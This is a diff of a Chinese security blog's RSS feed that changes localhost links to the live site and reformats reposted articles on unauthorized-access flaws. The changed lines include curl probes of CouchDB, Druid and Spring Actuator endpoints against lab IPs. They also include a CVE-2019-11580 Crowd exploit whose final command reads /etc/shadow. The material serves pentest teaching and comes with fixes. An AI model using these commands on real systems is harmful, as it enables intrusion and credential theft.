@@ -1,15 +1,15 @@
 <rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
     <channel>
         <title>总结 - 标签 - bysec</title>
-        <link>http://localhost:1313/tags/%E6%80%BB%E7%BB%93/</link>
+        <link>https://www.bysec.cn/tags/%E6%80%BB%E7%BB%93/</link>
         <description>总结 - 标签 - bysec</description>
         <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><managingEditor>bysec@qq.com (bysec)</managingEditor>
-            <webMaster>bysec@qq.com (bysec)</webMaster><lastBuildDate>Sun, 06 Oct 2024 19:59:39 &#43;0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E6%80%BB%E7%BB%93/" rel="self" type="application/rss+xml" /><item>
+            <webMaster>bysec@qq.com (bysec)</webMaster><lastBuildDate>Sun, 06 Oct 2024 19:59:39 &#43;0800</lastBuildDate><atom:link href="https://www.bysec.cn/tags/%E6%80%BB%E7%BB%93/" rel="self" type="application/rss+xml" /><item>
     <title>常用的38种未授权访问漏洞汇总</title>
-    <link>http://localhost:1313/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/</link>
+    <link>https://www.bysec.cn/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/</link>
     <pubDate>Sun, 06 Oct 2024 19:59:39 &#43;0800</pubDate><author>
         <name>bysec</name>
-    </author><guid>http://localhost:1313/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/</guid>
+    </author><guid>https://www.bysec.cn/%E5%B8%B8%E7%94%A8%E7%9A%8438%E7%A7%8D%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/</guid>
     <description><![CDATA[<blockquote>
 <p><em>转载自： <a href="https://www.freebuf.com/articles/web/338459.html" target="_blank" rel="noopener noreferrer">https://www.freebuf.com/articles/web/338459.html</a></em></p>
 </blockquote>
@@ -316,8 +316,8 @@
 <p><strong>漏洞检测</strong></p>
 <p>1、端口扫描</p>
 <p>2、未授权访问kali测试命令</p>
-<p>curl 192.168.126.130:5984</p>
-<p>curl 192.168.126.130:5984/_config</p>
+<p><code>curl 192.168.126.130:5984</code></p>
+<p><code>curl 192.168.126.130:5984/\_config</code></p>
 <p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00001lb4Dw0ztslv.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00001lb4Dw0ztslv.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00001lb4Dw0ztslv.jpg">
         
     </a></p>
@@ -393,7 +393,7 @@
 <p><strong>漏洞检测</strong></p>
 <ul>
 <li><strong>端口扫描</strong></li>
-<li><strong>Kali****连接主机</strong></li>
+<li><strong>Kali连接主机</strong></li>
 </ul>
 <p>（1）kali安装redis-cli远程连接工具</p>
 <div class="highlight"><div class="chroma">
@@ -449,11 +449,17 @@
 </ol>
 <p>修改 redis.conf 文件，添加</p>
 <p><code>requirepass  mypasswd</code></p>
-<p>3、在需要对外开放的时候修改默认端口（端口不重复就可以）</p>
+<ol start="3">
+<li>在需要对外开放的时候修改默认端口（端口不重复就可以）</li>
+</ol>
 <p><code>port 2344</code></p>
-<p>4、以低权限运行 Redis 服务（重启redis才能生效）</p>
+<ol start="4">
+<li>以低权限运行 Redis 服务（重启redis才能生效）</li>
+</ol>
 <p>为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆</p>
-<p>5、最后还可以配合iptables限制开放</p>
+<ol start="5">
+<li>最后还可以配合iptables限制开放</li>
+</ol>
 <h2 id="12-weblogic-未授权访问7001" class="headerLink">
     <a href="#12-weblogic-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae7001" class="header-mark"></a>12. Weblogic 未授权访问（7001）</h2><p><strong>漏洞简介</strong></p>
 <p>Weblogic是Oracle公司推出的J2EE应用服务器，CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台。</p>
@@ -499,7 +505,7 @@
 <p><code>docker-compose up -d</code></p>
 <p>3、环境启动后，没有配置身份认证，可以未授权访问到Hadoop YARN ResourceManager WebUI页面。</p>
 <p>http://192.168.126.130:8088/</p>
-<p><a href="http://192.168.126.130:8088/cluster" target="_blank" rel="noopener noreferrer">http://192.168.126.130:8088/cluster</a></p>
+<p>http://192.168.126.130:8088/cluster</p>
 <p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00003yMfMf1KyFD3.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00003yMfMf1KyFD3.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00003yMfMf1KyFD3.jpg">
         
     </a></p>
@@ -623,7 +629,7 @@
 <ol start="2">
 <li>检测</li>
 </ol>
-<p>（1）端口：8080 <a href="http://10.10.4.89:8080/" target="_blank" rel="noopener noreferrer">http://10.10.4.89:8080/</a></p>
+<p>（1）端口：8080 http://10.10.4.89:8080/</p>
 <p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00004TvEQr3OJPAf.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00004TvEQr3OJPAf.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00004TvEQr3OJPAf.jpg">
         
     </a></p>
@@ -660,8 +666,8 @@
 <ol>
 <li>使用vulhub搭建漏洞演示环境</li>
 </ol>
-<p>cd /vulhub/jupyter/notebook-rce</p>
-<p>docker-compose up -d</p>
+<p><code>cd /vulhub/jupyter/notebook-rce</code></p>
+<p><code>docker-compose up -d</code></p>
 <ol start="2">
 <li>
 <p>端口扫描</p>
@@ -786,9 +792,9 @@
 </li>
 </ol>
 <p>默认账号密码都是guest</p>
-<p><a href="http://10.10.4.89:15672/" target="_blank" rel="noopener noreferrer">http://10.10.4.89:15672</a></p>
-<p>http://10.10.4.89:15692</p>
-<p>http://10.10.4.89:25672</p>
+<p>http://10.10.4.89:15672
+http://10.10.4.89:15692
+http://10.10.4.89:25672</p>
 <p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000019g3pk18vKlS.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD000019g3pk18vKlS.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000019g3pk18vKlS.jpg">
         
     </a></p>
@@ -876,31 +882,12 @@
 <p>Druid是阿里巴巴数据库出品的，为监控而生的数据库连接池，并且Druid提供的监控功能，监控SQL的执行时间、监控Web URI的请求、Session监控，首先Druid是不存在什么漏洞的。但当开发者配置不当时就可能造成未授权访问。</p>
 <p><strong>漏洞检测</strong></p>
 <p>直接在网站的url中后加上：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span><span class="lnt">9
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/druid/index.htm
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/druid/websession.htm
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/druid/datasource.htm
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/druid/sql.htm
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">/druid/spring.html
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>如果可以无需登录，即可登录到Druid监控界面，则说明该网站存在Druid未授权访问漏洞</p>
+<p><code>/druid/index.htm</code>
+<code>/druid/websession.htm</code>
+<code>/druid/datasource.htm</code>
+<code>/druid/sql.htm</code>
+<code>/druid/spring.html</code></p>
+<p>如果可以无需登录，即可登录到Druid监控界面，则说明该网站存在Druid未授权访问漏洞</p>
 <p><strong><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00000TJF6y3Iw456.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00000TJF6y3Iw456.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00000TJF6y3Iw456.jpg">
         
     </a></strong></p>
@@ -932,9 +919,9 @@
 <li>直接访问相关路径：</li>
 </ol>
 <p>http://10.2.20.48/actuator/autoconfig</p>
-<p><a href="http://10.2.20.48/env" target="_blank" rel="noopener noreferrer">http://10.2.20.48 /actuator/env</a></p>
+<p>http://10.2.20.48/actuator/env</p>
 <p>http://10.2.20.48/actuator/dump</p>
-<p><a href="http://10.2.20.48/actuator/headdump" target="_blank" rel="noopener noreferrer">http://10.2.20.48/actuator/headdump</a>可下载</p>
+<p>http://10.2.20.48/actuator/headdump</p>
 <p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD00002UcRo10yaQFY.jpg" title="https://qqq.gtimg.cn/music/photo_new/T053XD00002UcRo10yaQFY.jpg" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD00002UcRo10yaQFY.jpg">
         
     </a></p>
@@ -942,7 +929,7 @@
 <li>actuator未直接部署在IP根目录下</li>
 </ol>
 <p>使用burpsuite的插件：APIKit</p>
-<p>介绍：<a href="https://www.bilibili.com/read/cv15912732" target="_blank" rel="noopener noreferrer">https://www.bilibili.com/read/cv15912732</a></p>
+<p>介绍：https://www.bilibili.com/read/cv15912732</p>
 <p>介绍：https://blog.csdn.net/qq_50854790/article/details/122894291</p>
 <p><strong>漏洞修复</strong></p>
 <ul>
@@ -1316,7 +1303,7 @@
 <p><strong>漏洞检测</strong></p>
 <ol>
 <li>
-<p>目录扫描：/pma   或者 /phpmyadmin</p>
+<p>目录扫描：/pma 或者 /phpmyadmin</p>
 </li>
 <li>
 <p>漏洞URL：http://ip:888/pma</p>
@@ -1351,13 +1338,13 @@
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">git clone https://github.com/jas502n/CVE-2019-11580
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">git clone https://github.com/jas502n/CVE-2019-11580
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">cd CVE-2019-11580/
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> CVE-2019-11580/
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">python CVE-2019-11580.py http://192.168.18.138:8095
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">curl http://192.168.18.138:8095/crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow
+</span></span><span class="line"><span class="cl">curl http://192.168.18.138:8095/crowd/plugins/servlet/exp?cmd<span class="o">=</span>cat%20/etc/shadow
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p><strong>漏洞修复</strong></p>
@@ -1382,7 +1369,7 @@
     <a href="#38-thinkadminv6%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae%e6%bc%8f%e6%b4%9e" class="header-mark"></a>38. ThinkAdminV6未授权访问漏洞</h2><p><strong>环境部署</strong></p>
 <p>略。</p>
 <p><strong>漏洞复现</strong></p>
-<p>可参考<a href="https://www.cnblogs.com/cn-gov/p/13715861.html" target="_blank" rel="noopener noreferrer">https://www.cnblogs.com/cn-gov/p/13715861.html</a></p>
+<p>可参考 <a href="https://www.cnblogs.com/cn-gov/p/13715861.html" target="_blank" rel="noopener noreferrer">https://www.cnblogs.com/cn-gov/p/13715861.html</a></p>
 <h2 id="归纳补充" class="headerLink">
     <a href="#%e5%bd%92%e7%ba%b3%e8%a1%a5%e5%85%85" class="header-mark"></a>归纳补充</h2><p><strong>本人补充：批量检测漏洞思路（史上最经典）</strong></p>
 <ul>
@@ -1402,10 +1389,10 @@
 <p><a href="https://www.freebuf.com/articles/web/278245.html" target="_blank" rel="noopener noreferrer">https://www.freebuf.com/articles/web/278245.html</a></p>]]></description>
 </item><item>
     <title>验证码渗透最全总结</title>
-    <link>http://localhost:1313/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/</link>
+    <link>https://www.bysec.cn/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/</link>
     <pubDate>Mon, 20 May 2024 17:55:46 &#43;0800</pubDate><author>
         <name>bysec</name>
-    </author><guid>http://localhost:1313/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/</guid>
+    </author><guid>https://www.bysec.cn/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%B8%97%E9%80%8F%E6%9C%80%E5%85%A8%E6%80%BB%E7%BB%93/</guid>
     <description><![CDATA[<blockquote>
 <p><em>转载自： <a href="https://forum.butian.net/share/2602" target="_blank" rel="noopener noreferrer">https://forum.butian.net/share/2602</a></em></p>
 </blockquote>
@@ -1535,10 +1522,10 @@
 <p>本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者及本公众号不为此承担任何责任。</p>]]></description>
 </item><item>
     <title>万字总结信息收集全网最全</title>
-    <link>http://localhost:1313/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/</link>
+    <link>https://www.bysec.cn/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/</link>
     <pubDate>Fri, 26 Apr 2024 18:19:39 &#43;0800</pubDate><author>
         <name>bysec</name>
-    </author><guid>http://localhost:1313/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/</guid>
+    </author><guid>https://www.bysec.cn/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/</guid>
     <description><![CDATA[<blockquote>
 <p><em>转载自： <a href="https://forum.butian.net/share/2841" target="_blank" rel="noopener noreferrer">https://forum.butian.net/share/2841</a></em></p>
 </blockquote>
@@ -2504,10 +2491,10 @@
 <p>·12社工、XSS利用社会工程系获取后台，利用存储型XSs获取后台</p>]]></description>
 </item><item>
     <title>任意用户登录漏洞挖掘思路</title>
-    <link>http://localhost:1313/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/</link>
+    <link>https://www.bysec.cn/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/</link>
     <pubDate>Sat, 20 Jan 2024 18:17:14 &#43;0800</pubDate><author>
         <name>bysec</name>
-    </author><guid>http://localhost:1313/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/</guid>
+    </author><guid>https://www.bysec.cn/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/</guid>
     <description><![CDATA[<blockquote>
 <p><em>转载自： <a href="https://forum.butian.net/share/2553" target="_blank" rel="noopener noreferrer">https://forum.butian.net/share/2553</a></em></p>
 </blockquote>
